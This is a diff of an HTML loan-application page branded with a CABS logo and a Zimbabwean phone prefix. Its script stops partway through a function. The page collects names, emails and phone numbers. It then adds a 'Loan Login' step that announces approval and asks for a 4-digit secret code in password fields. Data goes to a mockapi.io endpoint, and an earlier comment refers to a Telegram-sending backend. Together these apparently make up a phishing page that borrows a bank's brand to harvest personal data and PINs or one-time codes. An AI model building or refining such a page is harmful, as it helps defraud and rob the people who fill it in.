@@ -1,1335 +1,1418 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Loan Application</title>
-
-    <!--
-    ============================================================
-    LOGIN GUARD
-    ============================================================
-
-    login.html should store "loginId" in sessionStorage after
-    successful login and then redirect the user to this page.
-
-    Example:
-        sessionStorage.setItem("loginId", user.id);
-        window.location.href = "index.html";
-
-    If there is no login session, the user is returned to login.html.
-    ============================================================
-    -->
-
-    <script>
-        (function () {
-
-            const loginId =
-                sessionStorage.getItem("loginId");
-
-            if (!loginId) {
-                window.location.replace("login.html");
-            }
-
-        })();
-    </script>
-
-
-    <style>
-
-        * {
-            box-sizing: border-box;
-        }
-
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-
-        body {
-            margin: 0;
-            min-height: 100vh;
-            font-family: Arial, Helvetica, sans-serif;
-            background: #f3f6fa;
-            color: #1f2937;
-        }
-
-
-        .page {
-            width: 100%;
-            min-height: 100vh;
-            padding: 20px 15px;
-        }
-
-
-        .app {
-            width: 100%;
-            max-width: 480px;
-            margin: 0 auto;
-        }
-
-
-        /* =====================================================
-           LOGO
-        ===================================================== */
-
-        .logo-area {
-            text-align: center;
-            margin-bottom: 18px;
-        }
-
-
-        .logo {
-            display: block;
-            width: 110px;
-            max-width: 45%;
-            height: auto;
-            max-height: 80px;
-            object-fit: contain;
-            margin: 0 auto 10px;
-        }
-
-
-        .brand-title {
-            margin: 0;
-            font-size: 21px;
-            font-weight: 700;
-            color: #111827;
-        }
-
-
-        .brand-subtitle {
-            margin: 5px 0 0;
-            font-size: 13px;
-            color: #6b7280;
-        }
-
-
-        /* =====================================================
-           PROGRESS
-        ===================================================== */
-
-        .progress-card {
-            background: #fff;
-            border-radius: 14px;
-            padding: 15px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 18px rgba(0,0,0,.06);
-        }
-
-
-        .progress {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: relative;
-        }
-
-
-        .progress-line {
-            position: absolute;
-            top: 15px;
-            left: 30px;
-            right: 30px;
-            height: 2px;
-            background: #e5e7eb;
-            z-index: 0;
-        }
-
-
-        .step {
-            position: relative;
-            z-index: 1;
-            text-align: center;
-            background: #fff;
-        }
-
-
-        .step-number {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 5px;
-            background: #e5e7eb;
-            color: #6b7280;
-            font-size: 13px;
-            font-weight: bold;
-        }
-
-
-        .step-label {
-            font-size: 10px;
-            color: #6b7280;
-        }
-
-
-        .step.active .step-number {
-            background: #2563eb;
-            color: #fff;
-        }
-
-
-        .step.active .step-label {
-            color: #2563eb;
-            font-weight: bold;
-        }
-
-
-        /* =====================================================
-           SECTIONS
-        ===================================================== */
-
-        .section {
-            background: #fff;
-            border-radius: 16px;
-            padding: 22px 18px;
-            box-shadow: 0 5px 22px rgba(0,0,0,.07);
-            margin-bottom: 15px;
-        }
-
-
-        .section-header {
-            text-align: center;
-            margin-bottom: 22px;
-        }
-
-
-        .section-header h2 {
-            margin: 0 0 7px;
-            font-size: 21px;
-            color: #111827;
-        }
-
-
-        .section-header p {
-            margin: 0;
-            color: #6b7280;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-
-        /* =====================================================
-           FORM
-        ===================================================== */
-
-        .form-group {
-            margin-bottom: 17px;
-        }
-
-
-        label {
-            display: block;
-            margin-bottom: 7px;
-            font-size: 14px;
-            font-weight: 600;
-            color: #374151;
-        }
-
-
-        input {
-            width: 100%;
-            height: 48px;
-            padding: 0 13px;
-            border: 1px solid #d1d5db;
-            border-radius: 9px;
-            background: #fff;
-            color: #111827;
-            font-size: 15px;
-            outline: none;
-            transition: border-color .2s, box-shadow .2s;
-        }
-
-
-        input:focus {
-            border-color: #2563eb;
-            box-shadow: 0 0 0 3px rgba(37,99,235,.10);
-        }
-
-
-        .phone-container {
-            display: flex;
-            width: 100%;
-        }
-
-
-        .country-code {
-            height: 48px;
-            display: flex;
-            align-items: center;
-            padding: 0 13px;
-            background: #f3f4f6;
-            border: 1px solid #d1d5db;
-            border-right: 0;
-            border-radius: 9px 0 0 9px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-
-        .phone-container input {
-            border-radius: 0 9px 9px 0;
-        }
-
-
-        /* =====================================================
-           BUTTONS
-        ===================================================== */
-
-        button {
-            width: 100%;
-            min-height: 48px;
-            border: none;
-            border-radius: 9px;
-            background: #2563eb;
-            color: #fff;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: .2s;
-            margin-top: 7px;
-        }
-
-
-        button:hover {
-            background: #1d4ed8;
-        }
-
-
-        button:disabled {
-            background: #9ca3af;
-            cursor: not-allowed;
-        }
-
-
-        .back-button {
-            background: #f3f4f6;
-            color: #374151;
-            margin-top: 10px;
-        }
-
-
-        .back-button:hover {
-            background: #e5e7eb;
-        }
-
-
-        /* =====================================================
-           LOAN AMOUNTS
-        ===================================================== */
-
-        .amount-list {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 11px;
-        }
-
-
-        .amount-list button {
-            margin: 0;
-            background: #f8fafc;
-            color: #1f2937;
-            border: 1px solid #dbe2ea;
-            min-height: 58px;
-        }
-
-
-        .amount-list button:hover {
-            background: #2563eb;
-            color: #fff;
-        }
-
-
-        /* =====================================================
-           REVIEW
-        ===================================================== */
-
-        .review {
-            background: #f8fafc;
-            border: 1px solid #e5e7eb;
-            border-radius: 11px;
-            overflow: hidden;
-        }
-
-
-        .review-row {
-            display: flex;
-            justify-content: space-between;
-            gap: 15px;
-            padding: 13px;
-            border-bottom: 1px solid #e5e7eb;
-            font-size: 13px;
-        }
-
-
-        .review-row:last-child {
-            border-bottom: none;
-        }
-
-
-        .review-label {
-            color: #6b7280;
-        }
-
-
-        .review-value {
-            text-align: right;
-            font-weight: 600;
-            color: #111827;
-            word-break: break-word;
-        }
-
-
-        /* =====================================================
-           STATUS
-        ===================================================== */
-
-        .status-box {
-            text-align: center;
-            padding: 12px 4px 5px;
-        }
-
-
-        .status-icon {
-            width: 78px;
-            height: 78px;
-            margin: 0 auto 16px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #fff7e6;
-            font-size: 38px;
-        }
-
-
-        .status-title {
-            font-size: 22px;
-            line-height: 1.3;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-
-        .status-text {
-            color: #6b7280;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-
-        .approved {
-            color: #16803c;
-        }
-
-
-        .rejected {
-            color: #d62828;
-        }
-
-
-        .pending {
-            color: #c77b00;
-        }
-
-
-        .status-reference {
-            margin-top: 20px;
-            padding: 11px;
-            border-radius: 8px;
-            background: #f3f4f6;
-            font-size: 12px;
-            color: #6b7280;
-        }
-
-
-        /* =====================================================
-           GENERAL
-        ===================================================== */
-
-        .success {
-            text-align: center;
-            color: #16803c;
-            font-size: 13px;
-            font-weight: 600;
-            margin: 13px 0 0;
-        }
-
-
-        .hidden {
-            display: none !important;
-        }
-
-
-        .footer {
-            text-align: center;
-            padding: 5px 0 20px;
-            color: #9ca3af;
-            font-size: 11px;
-        }
-
-
-        /* =====================================================
-           MOBILE
-        ===================================================== */
-
-        @media (max-width: 360px) {
-
-            .page {
-                padding: 14px 10px;
-            }
-
-
-            .section {
-                padding: 19px 14px;
-            }
-
-
-            .section-header h2 {
-                font-size: 19px;
-            }
-
-
-            .amount-list {
-                grid-template-columns: 1fr;
-            }
-
-
-            .review-row {
-                flex-direction: column;
-                gap: 4px;
-            }
-
-
-            .review-value {
-                text-align: left;
-            }
-
-
-            .progress-line {
-                left: 25px;
-                right: 25px;
-            }
-
-        }
-
-    </style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Application</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f3f6fa;
+    color: #1f2937;
+}
+
+.page {
+    width: 100%;
+    min-height: 100vh;
+    padding: 20px 15px;
+}
+
+.app {
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+}
+
+/* LOGO */
+
+.logo-area {
+    text-align: center;
+    margin-bottom: 18px;
+}
+
+.logo {
+    display: block;
+    width: 110px;
+    max-width: 45%;
+    height: auto;
+    max-height: 80px;
+    object-fit: contain;
+    margin: 0 auto 10px;
+}
+
+.brand-title {
+    margin: 0;
+    font-size: 21px;
+    font-weight: 700;
+    color: #111827;
+}
+
+.brand-subtitle {
+    margin: 5px 0 0;
+    font-size: 13px;
+    color: #6b7280;
+}
+
+/* PROGRESS */
+
+.progress-card {
+    background: #fff;
+    border-radius: 14px;
+    padding: 15px;
+    margin-bottom: 15px;
+    box-shadow: 0 4px 18px rgba(0,0,0,.06);
+}
+
+.progress {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+}
+
+.progress-line {
+    position: absolute;
+    top: 15px;
+    left: 30px;
+    right: 30px;
+    height: 2px;
+    background: #e5e7eb;
+    z-index: 0;
+}
+
+.step {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    background: #fff;
+}
+
+.step-number {
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 5px;
+    background: #e5e7eb;
+    color: #6b7280;
+    font-size: 13px;
+    font-weight: bold;
+}
+
+.step-label {
+    font-size: 10px;
+    color: #6b7280;
+}
+
+.step.active .step-number {
+    background: #2563eb;
+    color: #fff;
+}
+
+.step.active .step-label {
+    color: #2563eb;
+    font-weight: bold;
+}
+
+/* SECTIONS */
+
+.section {
+    background: #fff;
+    border-radius: 16px;
+    padding: 22px 18px;
+    box-shadow: 0 5px 22px rgba(0,0,0,.07);
+    margin-bottom: 15px;
+}
+
+.section-header {
+    text-align: center;
+    margin-bottom: 22px;
+}
+
+.section-header h2 {
+    margin: 0 0 7px;
+    font-size: 21px;
+    color: #111827;
+}
+
+.section-header p {
+    margin: 0;
+    color: #6b7280;
+    font-size: 13px;
+    line-height: 1.5;
+}
+
+/* FORM */
+
+.form-group {
+    margin-bottom: 17px;
+}
+
+label {
+    display: block;
+    margin-bottom: 7px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #374151;
+}
+
+input {
+    width: 100%;
+    height: 48px;
+    padding: 0 13px;
+    border: 1px solid #d1d5db;
+    border-radius: 9px;
+    background: #fff;
+    color: #111827;
+    font-size: 15px;
+    outline: none;
+    transition: border-color .2s, box-shadow .2s;
+}
+
+input:focus {
+    border-color: #2563eb;
+    box-shadow: 0 0 0 3px rgba(37,99,235,.10);
+}
+
+.phone-container {
+    display: flex;
+    width: 100%;
+}
+
+.country-code {
+    height: 48px;
+    display: flex;
+    align-items: center;
+    padding: 0 13px;
+    background: #f3f4f6;
+    border: 1px solid #d1d5db;
+    border-right: 0;
+    border-radius: 9px 0 0 9px;
+    font-size: 14px;
+    font-weight: 600;
+}
+
+.phone-container input {
+    border-radius: 0 9px 9px 0;
+}
+
+/* BUTTONS */
+
+button {
+    width: 100%;
+    min-height: 48px;
+    border: none;
+    border-radius: 9px;
+    background: #2563eb;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: .2s;
+    margin-top: 7px;
+}
+
+button:hover {
+    background: #1d4ed8;
+}
+
+button:disabled {
+    background: #9ca3af;
+    cursor: not-allowed;
+}
+
+.back-button {
+    background: #f3f4f6;
+    color: #374151;
+    margin-top: 10px;
+}
+
+.back-button:hover {
+    background: #e5e7eb;
+}
+
+/* LOAN AMOUNTS */
+
+.amount-list {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 11px;
+}
+
+.amount-list button {
+    margin: 0;
+    background: #f8fafc;
+    color: #1f2937;
+    border: 1px solid #dbe2ea;
+    min-height: 58px;
+}
+
+.amount-list button:hover {
+    background: #2563eb;
+    color: #fff;
+}
+
+/* REVIEW */
+
+.review {
+    background: #f8fafc;
+    border: 1px solid #e5e7eb;
+    border-radius: 11px;
+    overflow: hidden;
+}
+
+.review-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+    padding: 13px;
+    border-bottom: 1px solid #e5e7eb;
+    font-size: 13px;
+}
+
+.review-row:last-child {
+    border-bottom: none;
+}
+
+.review-label {
+    color: #6b7280;
+}
+
+.review-value {
+    text-align: right;
+    font-weight: 600;
+    color: #111827;
+    word-break: break-word;
+}
+
+/* STATUS */
+
+.status-box {
+    text-align: center;
+    padding: 12px 4px 5px;
+}
+
+.status-icon {
+    width: 78px;
+    height: 78px;
+    margin: 0 auto 16px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fff7e6;
+    font-size: 38px;
+}
+
+.status-title {
+    font-size: 22px;
+    line-height: 1.3;
+    font-weight: 700;
+    margin-bottom: 10px;
+}
+
+.status-text {
+    color: #6b7280;
+    font-size: 14px;
+    line-height: 1.6;
+}
+
+.approved {
+    color: #16803c;
+}
+
+.rejected {
+    color: #d62828;
+}
+
+.pending {
+    color: #c77b00;
+}
+
+.status-reference {
+    margin-top: 20px;
+    padding: 11px;
+    border-radius: 8px;
+    background: #f3f4f6;
+    font-size: 12px;
+    color: #6b7280;
+}
+
+/* LOGIN */
+
+.login-info {
+    text-align: center;
+    background: #f8fafc;
+    border-radius: 10px;
+    padding: 12px;
+    margin-bottom: 20px;
+    font-size: 13px;
+    color: #6b7280;
+}
+
+.pin-label {
+    text-align: center;
+    margin-bottom: 8px;
+}
+
+.pin-container {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 12px 0 22px;
+}
+
+.pin-input {
+    width: 55px;
+    height: 58px;
+    padding: 0;
+    text-align: center;
+    font-size: 23px;
+    font-weight: 700;
+    border: 1px solid #d1d5db;
+    border-radius: 10px;
+}
+
+.pin-input:focus {
+    border-color: #2563eb;
+    box-shadow: 0 0 0 3px rgba(37,99,235,.10);
+}
+
+.login-message {
+    text-align: center;
+    font-size: 13px;
+    margin-top: 13px;
+    line-height: 1.5;
+}
+
+.login-error {
+    color: #d62828;
+}
+
+.login-success {
+    color: #16803c;
+}
+
+/* GENERAL */
+
+.success {
+    text-align: center;
+    color: #16803c;
+    font-size: 13px;
+    font-weight: 600;
+    margin: 13px 0 0;
+}
+
+.hidden {
+    display: none !important;
+}
+
+.footer {
+    text-align: center;
+    padding: 5px 0 20px;
+    color: #9ca3af;
+    font-size: 11px;
+}
+
+/* MOBILE */
+
+@media (max-width: 360px) {
+
+    .page {
+        padding: 14px 10px;
+    }
+
+    .section {
+        padding: 19px 14px;
+    }
+
+    .section-header h2 {
+        font-size: 19px;
+    }
+
+    .amount-list {
+        grid-template-columns: 1fr;
+    }
+
+    .review-row {
+        flex-direction: column;
+        gap: 4px;
+    }
+
+    .review-value {
+        text-align: left;
+    }
+
+    .progress-line {
+        left: 25px;
+        right: 25px;
+    }
+
+    .pin-container {
+        gap: 7px;
+    }
+
+    .pin-input {
+        width: 50px;
+        height: 54px;
+    }
+}
+</style>
 </head>
-
 
 <body>
 
-
 <div class="page">
 
-    <div class="app">
+<div class="app">
 
+<!-- LOGO -->
 
-        <!-- =================================================
-             LOGO
-        ================================================== -->
+<div class="logo-area">
 
-        <div class="logo-area">
+<img
+    src="/cabslogo.jpeg"
+    alt="CABS Logo"
+    class="logo"
+>
 
-            <img
-                src="/cabslogo.jpeg"
-                alt="CABS Logo"
-                class="logo"
-            >
+<h1 class="brand-title">
+    Loan Application
+</h1>
 
-            <h1 class="brand-title">
-                Loan Application
-            </h1>
+<p class="brand-subtitle">
+    Simple, secure and convenient
+</p>
 
-            <p class="brand-subtitle">
-                Simple, secure and convenient
-            </p>
+</div>
 
-        </div>
 
+<!-- PROGRESS -->
 
-        <!-- =================================================
-             PROGRESS
-        ================================================== -->
+<div
+    class="progress-card"
+    id="progressCard"
+>
 
-        <div
-            class="progress-card"
-            id="progressCard"
-        >
+<div class="progress">
 
-            <div class="progress">
+<div class="progress-line"></div>
 
-                <div class="progress-line"></div>
+<div class="step active" id="progressStep1">
+    <div class="step-number">1</div>
+    <div class="step-label">Personal</div>
+</div>
 
+<div class="step" id="progressStep2">
+    <div class="step-number">2</div>
+    <div class="step-label">Amount</div>
+</div>
 
-                <div
-                    class="step active"
-                    id="progressStep1"
-                >
+<div class="step" id="progressStep3">
+    <div class="step-number">3</div>
+    <div class="step-label">Review</div>
+</div>
 
-                    <div class="step-number">
-                        1
-                    </div>
+<div class="step" id="progressStep4">
+    <div class="step-number">4</div>
+    <div class="step-label">Status</div>
+</div>
 
-                    <div class="step-label">
-                        Personal
-                    </div>
+</div>
+</div>
 
-                </div>
 
+<!-- STEP 1 -->
 
-                <div
-                    class="step"
-                    id="progressStep2"
-                >
+<div id="registerForm" class="section">
 
-                    <div class="step-number">
-                        2
-                    </div>
+<div class="section-header">
 
-                    <div class="step-label">
-                        Amount
-                    </div>
+<h2>Personal Information</h2>
 
-                </div>
+<p>
+Enter your details to begin your loan application.
+</p>
 
+</div>
 
-                <div
-                    class="step"
-                    id="progressStep3"
-                >
+<div class="form-group">
 
-                    <div class="step-number">
-                        3
-                    </div>
+<label for="firstName">
+First Name
+</label>
 
-                    <div class="step-label">
-                        Review
-                    </div>
+<input
+type="text"
+id="firstName"
+placeholder="Enter first name"
+autocomplete="given-name"
+>
 
-                </div>
+</div>
 
 
-                <div
-                    class="step"
-                    id="progressStep4"
-                >
+<div class="form-group">
 
-                    <div class="step-number">
-                        4
-                    </div>
+<label for="lastName">
+Last Name
+</label>
 
-                    <div class="step-label">
-                        Status
-                    </div>
+<input
+type="text"
+id="lastName"
+placeholder="Enter last name"
+autocomplete="family-name"
+>
 
-                </div>
+</div>
 
-            </div>
 
-        </div>
+<div class="form-group">
 
+<label for="email">
+Email Address
+</label>
 
-        <!-- =================================================
-             STEP 1
-        ================================================== -->
+<input
+type="email"
+id="email"
+placeholder="Enter email address"
+autocomplete="email"
+>
 
-        <div
-            id="registerForm"
-            class="section"
-        >
+</div>
 
-            <div class="section-header">
 
-                <h2>
-                    Personal Information
-                </h2>
+<div class="form-group">
 
-                <p>
-                    Enter your details to begin your loan application.
-                </p>
+<label for="phone">
+Phone Number
+</label>
 
-            </div>
+<div class="phone-container">
 
+<div class="country-code">
++263
+</div>
 
-            <div class="form-group">
+<input
+type="tel"
+id="phone"
+placeholder="77XXXXXXX"
+inputmode="numeric"
+autocomplete="tel"
+maxlength="9"
+oninput="formatPhone()"
+>
 
-                <label for="firstName">
-                    First Name
-                </label>
+</div>
 
-                <input
-                    type="text"
-                    id="firstName"
-                    placeholder="Enter first name"
-                    autocomplete="given-name"
-                >
+</div>
 
-            </div>
 
+<button onclick="registerUser()">
+Continue
+</button>
 
-            <div class="form-group">
 
-                <label for="lastName">
-                    Last Name
-                </label>
+<p
+id="successMsgRegister"
+class="success hidden"
+>
+✓ Information Saved
+</p>
 
-                <input
-                    type="text"
-                    id="lastName"
-                    placeholder="Enter last name"
-                    autocomplete="family-name"
-                >
+</div>
 
-            </div>
 
+<!-- STEP 2 -->
 
-            <div class="form-group">
+<div
+id="loanForm"
+class="section hidden"
+>
 
-                <label for="email">
-                    Email Address
-                </label>
+<div class="section-header">
 
-                <input
-                    type="email"
-                    id="email"
-                    placeholder="Enter email address"
-                    autocomplete="email"
-                >
+<h2>Select Loan Amount</h2>
 
-            </div>
+<p>
+Choose the amount you would like to apply for.
+</p>
 
+</div>
 
-            <div class="form-group">
 
-                <label for="phone">
-                    Phone Number
-                </label>
+<div
+class="amount-list"
+id="amountList"
+></div>
 
-                <div class="phone-container">
 
-                    <div class="country-code">
-                        +263
-                    </div>
+<button
+class="back-button"
+onclick="goBackToPersonal()"
+>
+← Back
+</button>
 
-                    <input
-                        type="tel"
-                        id="phone"
-                        placeholder="77XXXXXXX"
-                        inputmode="numeric"
-                        autocomplete="tel"
-                        maxlength="9"
-                        oninput="formatPhone()"
-                    >
+</div>
 
-                </div>
 
-            </div>
+<!-- STEP 3 -->
 
+<div
+id="reviewForm"
+class="section hidden"
+>
 
-            <button onclick="registerUser()">
-                Continue
-            </button>
+<div class="section-header">
 
+<h2>Review Application</h2>
 
-            <p
-                id="successMsgRegister"
-                class="success hidden"
-            >
-                ✓ Information Saved
-            </p>
+<p>
+Please confirm that your information is correct.
+</p>
 
-        </div>
+</div>
 
 
-        <!-- =================================================
-             STEP 2
-        ================================================== -->
+<div class="review">
 
-        <div
-            id="loanForm"
-            class="section hidden"
-        >
+<div class="review-row">
 
-            <div class="section-header">
+<span class="review-label">
+First Name
+</span>
 
-                <h2>
-                    Select Loan Amount
-                </h2>
+<span
+class="review-value"
+id="reviewFirstName"
+></span>
 
-                <p>
-                    Choose the amount you would like to apply for.
-                </p>
+</div>
 
-            </div>
 
+<div class="review-row">
 
-            <div
-                class="amount-list"
-                id="amountList"
-            ></div>
+<span class="review-label">
+Last Name
+</span>
 
+<span
+class="review-value"
+id="reviewLastName"
+></span>
 
-            <button
-                class="back-button"
-                onclick="goBackToPersonal()"
-            >
-                ← Back
-            </button>
+</div>
 
-        </div>
 
+<div class="review-row">
 
-        <!-- =================================================
-             STEP 3
-        ================================================== -->
+<span class="review-label">
+Email
+</span>
 
-        <div
-            id="reviewForm"
-            class="section hidden"
-        >
+<span
+class="review-value"
+id="reviewEmail"
+></span>
 
-            <div class="section-header">
+</div>
 
-                <h2>
-                    Review Application
-                </h2>
 
-                <p>
-                    Please confirm that your information is correct.
-                </p>
+<div class="review-row">
 
-            </div>
+<span class="review-label">
+Phone Number
+</span>
 
+<span
+class="review-value"
+id="reviewPhone"
+></span>
 
-            <div class="review">
+</div>
 
 
-                <div class="review-row">
+<div class="review-row">
 
-                    <span class="review-label">
-                        First Name
-                    </span>
+<span class="review-label">
+Country
+</span>
 
-                    <span
-                        class="review-value"
-                        id="reviewFirstName"
-                    ></span>
+<span class="review-value">
+Zimbabwe
+</span>
 
-                </div>
+</div>
 
 
-                <div class="review-row">
+<div class="review-row">
 
-                    <span class="review-label">
-                        Last Name
-                    </span>
+<span class="review-label">
+Loan Amount
+</span>
 
-                    <span
-                        class="review-value"
-                        id="reviewLastName"
-                    ></span>
+<span
+class="review-value"
+id="reviewAmount"
+></span>
 
-                </div>
+</div>
 
+</div>
 
-                <div class="review-row">
 
-                    <span class="review-label">
-                        Email
-                    </span>
+<button onclick="applyLoan()">
+Submit Application
+</button>
 
-                    <span
-                        class="review-value"
-                        id="reviewEmail"
-                    ></span>
 
-                </div>
+<button
+class="back-button"
+onclick="goBackToAmount()"
+>
+← Back
+</button>
 
+</div>
 
-                <div class="review-row">
 
-                    <span class="review-label">
-                        Phone Number
-                    </span>
+<!-- STEP 4 STATUS -->
 
-                    <span
-                        class="review-value"
-                        id="reviewPhone"
-                    ></span>
+<div
+id="statusForm"
+class="section hidden"
+>
 
-                </div>
+<div class="status-box">
 
+<div
+id="statusIcon"
+class="status-icon"
+>
+⏳
+</div>
 
-                <div class="review-row">
 
-                    <span class="review-label">
-                        Country
-                    </span>
+<div
+id="statusTitle"
+class="status-title pending"
+>
+Application Under Review
+</div>
 
-                    <span class="review-value">
-                        Zimbabwe
-                    </span>
 
-                </div>
+<div
+id="statusText"
+class="status-text"
+>
+Your application has been submitted successfully
+and is currently being reviewed.
+</div>
 
 
-                <div class="review-row">
+<div
+id="statusReference"
+class="status-reference"
+>
+Application submitted successfully.
+</div>
 
-                    <span class="review-label">
-                        Loan Amount
-                    </span>
+</div>
 
-                    <span
-                        class="review-value"
-                        id="reviewAmount"
-                    ></span>
+</div>
 
-                </div>
 
+<!-- LOGIN PAGE -->
 
-            </div>
+<div
+id="loginForm"
+class="section hidden"
+>
 
+<div class="section-header">
 
-            <button onclick="applyLoan()">
-                Submit Application
-            </button>
+<h2>Loan Login</h2>
 
+<p>
+Your application has been approved.
+Enter your phone number and loan code to continue.
+</p>
 
-            <button
-                class="back-button"
-                onclick="goBackToAmount()"
-            >
-                ← Back
-            </button>
+</div>
 
-        </div>
 
+<div class="login-info">
 
-        <!-- =================================================
-             STEP 4 - STATUS
-        ================================================== -->
+Application ID:
+<strong id="loginApplicationId">
+</strong>
 
-        <div
-            id="statusForm"
-            class="section hidden"
-        >
+<br>
 
-            <div class="status-box">
+Approved phone:
+<strong id="loginPhone">
+</strong>
 
-                <div
-                    id="statusIcon"
-                    class="status-icon"
-                >
-                    ⏳
-                </div>
+</div>
 
 
-                <div
-                    id="statusTitle"
-                    class="status-title pending"
-                >
-                    Application Under Review
-                </div>
+<div class="form-group">
 
+<label for="loginPhoneInput">
+Phone Number
+</label>
 
-                <div
-                    id="statusText"
-                    class="status-text"
-                >
-                    Your application has been submitted successfully
-                    and is currently being reviewed.
-                </div>
+<div class="phone-container">
 
+<div class="country-code">
++263
+</div>
 
-                <div
-                    id="statusReference"
-                    class="status-reference"
-                >
-                    Application submitted successfully.
-                </div>
+<input
+type="tel"
+id="loginPhoneInput"
+placeholder="77XXXXXXX"
+inputmode="numeric"
+autocomplete="tel"
+maxlength="9"
+oninput="formatLoginPhone()"
+>
 
-            </div>
+</div>
 
-        </div>
+</div>
 
 
-        <!-- =================================================
-             FOOTER
-        ================================================== -->
+<div class="pin-label">
 
-        <div class="footer">
-            Loan Application Portal
-        </div>
+<label>
+4-Digit Loan Code
+</label>
 
+<p
+style="font-size:12px;color:#6b7280;margin:4px 0 0;"
+>
+Enter the loan/application code assigned to your approved application.
+</p>
 
-    </div>
+</div>
 
+
+<div
+class="pin-container"
+id="pinContainer"
+>
+
+<input
+class="pin-input"
+id="pin1"
+type="password"
+inputmode="numeric"
+maxlength="1"
+autocomplete="off"
+aria-label="Loan code digit 1"
+>
+
+<input
+class="pin-input"
+id="pin2"
+type="password"
+inputmode="numeric"
+maxlength="1"
+autocomplete="off"
+aria-label="Loan code digit 2"
+>
+
+<input
+class="pin-input"
+id="pin3"
+type="password"
+inputmode="numeric"
+maxlength="1"
+autocomplete="off"
+aria-label="Loan code digit 3"
+>
+
+<input
+class="pin-input"
+id="pin4"
+type="password"
+inputmode="numeric"
+maxlength="1"
+autocomplete="off"
+aria-label="Loan code digit 4"
+>
+
+</div>
+
+
+<button
+id="loginButton"
+onclick="loginUser()"
+>
+Login
+</button>
+
+
+<button
+class="back-button"
+onclick="goBackToStatus()"
+>
+← Back
+</button>
+
+
+<p
+id="loginMessage"
+class="login-message"
+></p>
+
+</div>
+
+
+<div class="footer">
+Loan Application Portal
+</div>
+
+</div>
 </div>
 
 
 <script>
 
-
-    /* ========================================================
-       CONFIGURATION
-    ======================================================== */
+const MOCK_API =
+    "https://6a7ae4d98c69b3eb4a17a33f.mockapi.io/approval";
 
 
-    /*
-    Your backend should handle:
+let userData = {
+    firstName: "",
+    lastName: "",
+    email: "",
+    phone: "",
+    loanAmount: ""
+};
 
-        POST /api/sendTelegram
 
-    and return:
+let applicationId = null;
 
-        {
-            "success": true,
-            "applicationId": "..."
+let statusTimer = null;
+
+
+/* ==========================
+   PROGRESS
+========================== */
+
+function setProgress(step) {
+
+    for (let i = 1; i <= 4; i++) {
+
+        const element =
+            document.getElementById(
+                "progressStep" + i
+            );
+
+        if (!element) continue;
+
+        if (i <= step) {
+            element.classList.add("active");
+        } else {
+            element.classList.remove("active");
         }
-
-    Status should be checked through:
-
-        GET /api/status?id=APPLICATION_ID
-    */
-
-
-    const MOCK_API =
-        "https://6a7ae4d98c69b3eb4a17a33f.mockapi.io/approval";
-
-
-    let userData = {
-
-        firstName: "",
-        lastName: "",
-        email: "",
-        phone: "",
-        loanAmount: ""
-
-    };
-
-
-    let applicationId = null;
-
-    let statusTimer = null;
-
-
-    /* ========================================================
-       PROGRESS
-    ======================================================== */
-
-
-    function setProgress(step) {
-
-        for (let i = 1; i <= 4; i++) {
-
-            const element =
-                document.getElementById(
-                    "progressStep" + i
-                );
-
-
-            if (!element) {
-                continue;
-            }
-
-
-            if (i <= step) {
-
-                element.classList.add("active");
-
-            } else {
-
-                element.classList.remove("active");
-
-            }
-
-        }
-
     }
+}
 
 
-    /* ========================================================
-       PHONE
-    ======================================================== */
+/* ==========================
+   PHONE
+========================== */
 
+function formatPhone() {
 
-    function formatPhone() {
+    const input =
+        document.getElementById("phone");
 
-        const input =
-            document.getElementById("phone");
+    input.value =
+        input.value.replace(/\D/g, "");
 
-
+    if (input.value.length > 9) {
         input.value =
-            input.value
-            .replace(/\D/g, "");
+            input.value.substring(0, 9);
+    }
+}
 
 
-        if (input.value.length > 9) {
+function formatLoginPhone() {
 
-            input.value =
-                input.value.substring(0, 9);
+    const input =
+        document.getElementById(
+            "loginPhoneInput"
+        );
 
-        }
+    input.value =
+        input.value.replace(/\D/g, "");
 
+    if (input.value.length > 9) {
+        input.value =
+            input.value.substring(0, 9);
+    }
+}
+
+
+/* ==========================
+   STEP 1
+========================== */
+
+function registerUser() {
+
+    const firstName =
+        document
+        .getElementById("firstName")
+        .value
+        .trim();
+
+    const lastName =
+        document
+        .getElementById("lastName")
+        .value
+        .trim();
+
+    const email =
+        document
+        .getElementById("email")
+        .value
+        .trim();
+
+    const phone =
+        document
+        .getElementById("phone")
+        .value
+        .trim();
+
+
+    if (
+        !firstName ||
+        !lastName ||
+        !email ||
+        !phone
+    ) {
+
+        alert(
+            "Please complete all fields."
+        );
+
+        return;
     }
 
 
-    /* ========================================================
-       STEP 1
-    ======================================================== */
+    const emailPattern =
+        /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
 
-    function registerUser() {
